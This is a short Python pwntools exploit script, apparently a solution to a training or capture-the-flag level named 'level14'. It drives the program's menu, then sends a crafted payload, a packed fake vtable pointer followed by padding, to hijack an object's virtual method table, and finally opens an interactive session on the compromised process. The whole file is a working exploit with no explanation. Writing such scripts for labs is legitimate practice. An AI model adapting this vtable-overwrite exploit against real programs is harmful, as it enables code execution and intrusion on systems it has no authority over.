#! /usr/bin/python3

from pwn import *
context.update(os='linux', arch='amd64')

DEBUG = 0
student_vtable = 0x00000000004020f8
if DEBUG and not args.LOCAL and not args.local:
    gs = '''
    b *main + 248
    b *main + 367
    continue
    '''
    r = gdb.debug("./level14",gdbscript = gs)

else:
    r = process("./level14")

stud_size = 0x38

r.sendline("1")
r.sendline("3")
r.sendline("56")
raw_input("continue")
r.sendline(p64(student_vtable-0x8) + b"A" * 0x2f)
r.sendline("2")
r.recv(timeout=1)
log.progress("pwned")
r.interactive()